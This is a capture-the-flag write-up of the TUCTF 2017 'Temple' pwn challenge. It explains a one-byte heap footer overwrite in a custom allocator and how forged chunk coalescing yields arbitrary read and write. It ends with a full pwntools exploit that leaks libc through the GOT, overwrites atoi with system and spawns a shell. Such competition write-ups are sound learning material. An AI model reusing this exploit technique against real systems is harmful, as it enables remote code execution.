# __TUCTF 2017__ 
## _Temple_

## Information
**Category:** | **Points:** | **Solves** | **Writeup Author**
--- | --- | --- | ---
Pwn | 500 | 49 | merrychap

**Description:** 

> Have you come to gain wisdom at the temple?
nc temple.tuctf.com 4343

>UPDATE:
the temple binary has been updated. Please redownload.
temple - md5: 8e61e448093f96043512bd3580223124
libc.so.6 - md5: 8548e4731a83e6ed3fc167633d28c21f

## Solution
We are given with several files: [mm.c](./mm.c), [temple](./temple) and [libc.so.6](./libc.so.6). First of all, let's examine ```mm.c``` file. It's obvious that this is some heap implementation. We will explore the file more carefully later.

### Launching of the binary
When I tried to run the binary I was faced with error ```>>>> BROKEN <<<<```. This happened because I didn't have file ```temple.txt``` in the same directory with the binary. So, we should create it like that ```echo "some_important_text" > temple.txt```

### Reversing the binary
I reversed [temple](./temple) using IDA Pro and its Hex-Rays decomplier. All decompiled code is placed in [temple.c](./temple.c) file. You can see this file or just decompile the binary by yourself.

We have an array with quotes, where we can modify only quotes created by us (first 8 quotes are reserved and created in ```make_wisdom()``` function)

### Find a vulnerability
Anyway, let's see the code. We can create, remove and modify wisdoms (or just quotes. Call it as you want). The interesting place here is ```readbytes(char* buf, int bufsize)``` function in ```modify_wisdom()```:

```c
__int64 __fastcall readbytes(char *buf, uint32_t bufsize) {
  fgets(buf, bufsize + 1, stdin);
  return bufsize + 1;
}


readbytes(quote->text, quote->text_size);
```

We can enter ```quote->text``` of a length ```quote->text_size + 1```. So, we overwrite one byte after ```quote->text```. Sounds pretty nice. It's time to see memory in a debugger.

Let's create six quotes. Each quote is ```32 bytes``` length and with text ```AAAA, BBBB, CCCC, DDDD, EEEE, FFFF```. 

Array of quotes (```temple```) looks as follows:
```
0x6031a0 <temple>:      0x0000000000625010      0x0000000000625040
0x6031b0 <temple+16>:   0x0000000000625070      0x00000000006250a0
0x6031c0 <temple+32>:   0x00000000006250d0      0x0000000000625100
0x6031d0 <temple+48>:   0x0000000000625130      0x0000000000625160
0x6031e0 <temple+64>:   0x0000000000625190      0x00000000006251f0
0x6031f0 <temple+80>:   0x0000000000625250      0x00000000006252b0
0x603200 <temple+96>:   0x0000000000625310      0x0000000000625370
```

Heap memory looks like this:
```
0x625180:       0x0000000000000031      0x0000000000000031 <-- beginning of a quote
0x625190:       0x0000000000000021      0x00000000006251c0 <-- address of a text
0x6251a0:       0x0000000000000008      0x0000000000401d61 <-- address of a character
0x6251b0:       0x0000000000000031      0x0000000000000031 <-- beginning of a text
0x6251c0:       0x0000000a41414141      0x0000000000000000
0x6251d0:       0x0000000000000000      0x0000000000000000
0x6251e0:       0x0000000000000031      0x0000000000000031
0x6251f0:       0x0000000000000021      0x0000000000625220
0x625200:       0x0000000000000008      0x0000000000401d61
0x625210:       0x0000000000000031      0x0000000000000031
0x625220:       0x0000000a42424242      0x0000000000000000
0x625230:       0x0000000000000000      0x0000000000000000
0x625240:       0x0000000000000031      0x0000000000000031
0x625250:       0x0000000000000021      0x0000000000625280
0x625260:       0x0000000000000008      0x0000000000401d61
0x625270:       0x0000000000000031      0x0000000000000031
0x625280:       0x0000000a43434343      0x0000000000000000
0x625290:       0x0000000000000000      0x0000000000000000
0x6252a0:       0x0000000000000031      0x0000000000000031
0x6252b0:       0x0000000000000021      0x00000000006252e0
[...]
```
All heap looks as follows: ```QUOTE | TEXT | QUOTE | TEXT ...```, where a quote is a structure that contains address of its text.

So, it's time to see what is placed in [mm.c](./mm.c). Heap chunk looks like this:

```|  HEADER  |  ... PAYLOAD ...  |  FOOTER  |```, where ```HEADER``` and ```FOOTER``` is 8 bytes length. 

Hence, the byte we overwrite is ```FOOTER``` byte. 

### Exploiting
Okay, we can control ```FOOTER``` byte, what's next? After that, we should see where ```FOOTER``` is used in heap implementation. Spending a little time on searching, I found that ```FOOTER``` is used in ```find_prev(block_t *block)``` function.

#### How does find_prev work?
When we free a chunk, after freeing a chunk itself, ```mm_free``` function make a coalescing of current, previous and next chunks.

So, ```find_prev``` looks at the ```FOOTER``` of a previous chunk and calculate the beginning of a previous chunk depending on the ```FOOTER```. And when the beginning is found, ```coalesce``` function checks if this chunk isn't allocated (just checks the least significant bit of the ```FOOTER```). If this chunk is free then it merges both chunks in the one.

#### The use of controlling a footer.
Controlling the footer, we control the beginnig of a previous chunk. It means that we can say that some chunk above is free (when this chunk is actually allocated). This action gives us an opportunity to overwrite address of ```quote->text```. If we can overwrite it, then we can further write bytes in an arbitrary place in a memory.

But let's see how we can overwrite ```quote->text```. For example, we have 3 quotes on a heap as written below.

```| QUOTE_1 | TEXT_1 | QUOTE_2 | TEXT_2 | QUOTE_3 | ... ```

In ```TEXT_2``` we can overwrite the footer of a chunk containing ```TEXT_2``` itself (by just modifying text in ```QUOTE_2```). After we remove a quote below (```QUOTE_3```), heap will merge ```TEXT_2``` and ```QUOTE_3``` chunks. In the footer of ```TEXT_2``` we can write ```0x90``` to point to the beginning of ```TEXT_1``` chunk. This merge will write 0x90 in the ```HEADER``` of ```TEXT_1``` and in the ```FOOTER``` of ```QUOTE_3```.

Actually, it doesn't matter what size is exactly we are writing. Important part here is the least significant bit of ```0x90``` is 0, which means ```TEXT_1``` chunk now is free (but still contains previous data).

When ```mm_malloc``` is called, it goes through a list of chunks and if it finds a suitable chunk, it will allocate this chunk again. Hence, when we call ```give_wisdom()```,  it will create a quote above of a previous ```TEXT_1``` chunk. Now the picture of chunks looks as follows:

 ```
| QUOTE_1 |   TEXT_1  | QUOTE_2  | TEXT_2 | QUOTE_3 | ... 
| QUOTE_1 | NEW_QUOTE | NEW_TEXT | TEXT_2 | QUOTE_3 | ...
 ```

As you can see, if we enter in ```NEW_TEXT``` suitable data, we can overwrite fields of ```QUOTE_2``` and it will overwrite ```quote->text``` address, as we wanted.

Okay, we're almost done. We can control ```quote->text``` address. If we will modify this quote, then we will write bytes in a new ```quote->text``` address. Also, we can print bytes located by this address.

I decided to leak addresses of ```GOT``` functions and after that calculate address of ```system()```, basing on the given libc. If I know address of ```system```, then I will be able to write this address in ```GOT``` entry and overwrite address of a function. Yes, easy __ret2libc attack__. Function for overwriting was ```atoi```. So, if we enter ```/bin/sh``` in ```readint()``` function, then we will spawn a shell.


The next [script](./exploit.py) does exactly what is written above:

```python
import struct

from pwn import *


prompt = 'Your choice:'


def take(pc, index):
    pc.sendline('1')
    pc.recvuntil('you seek?:')
    pc.sendline(str(index))
    return pc.recvuntil(prompt)

def give(pc, count, wisdom):
    pc.sendline('2')
    pc.recvuntil('you hold?:')
    pc.sendline(str(count))
    pc.recvuntil(' your wisdom?:')
    pc.sendline(wisdom)
    return pc.recvuntil(prompt)


def rethink(pc, index, wisdom, intr=False):
    pc.sendline('3')
    pc.recvuntil('to rethink?:')
    pc.sendline(str(index))
    pc.recvuntil('this differently?:')
    pc.sendline(wisdom)
    return pc.recvuntil(prompt)


def to_int(addr):
    return struct.unpack('Q', addr)[0]


def to_addr(n):
    return struct.pack('Q', n)


def main():
    # For locale tests
    # libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
    # pc = process('./temple')
    
    libc = ELF('./libc.so.6')
    pc = remote('temple.tuctf.com', 4343)
    pc.recvuntil(prompt)

    give(pc, 32, '/bin/sh')
    give(pc, 32, 'BBBB')
    give(pc, 32, 'CCCC')
    give(pc, 32, 'DDDD')
    give(pc, 32, 'EEEE')
    give(pc, 32, 'FFFF')
    give(pc, 32, 'GGGG')
    give(pc, 32, 'HHHH')
    give(pc, 32, 'IIII')
    give(pc, 32, 'JJJJ')
    give(pc, 32, 'KKKK')
    give(pc, 32, 'FFFF')
    give(pc, 32, 'GGGG')
    give(pc, 32, 'HHHH')
    give(pc, 32, 'IIII')
    give(pc, 32, 'JJJJ')
    give(pc, 32, 'KKKK')

    rethink(pc, 10, 'BBBBBB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x90')
    take(pc, 11)
    give(pc, 32, '\xff\xff\x00\x00\x00\x00\x00\x00\x18\x30\x60\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x1c\x40\x00\x00\x00\x00\x00')
    print(pc.recvuntil(':'))

    puts   = take(pc, 10)[1:9]
    system = to_addr(to_int(puts) - libc.symbols['puts'] + libc.symbols['system'])
    print('Puts address:   ' + hex(to_int(puts)))
    print('System address: ' + hex(to_int(puts)))

    ################################

    give(pc, 32, 'LLLL')
    give(pc, 32, 'LLLL')

    ################################

    rethink(pc, 18, 'BBBBBB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x90')
    take(pc, 19)
    give(pc, 32, '\xff\xff\x00\x00\x00\x00\x00\x00\x98\x30\x60\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x1c\x40\x00\x00\x00\x00\x00')
    pc.recvuntil(':')


    rethink(pc, 18, system)
    pc.sendline('/bin/sh\x00')
    
    pc.interactive()


if __name__ == '__main__':
    main()
```


Flag is:
> TUCTF{0n3_Byt3_0v3rwr1t3_Ac0lyt3}


<p align="center">
  <img src="screens/heap.png">
</p>
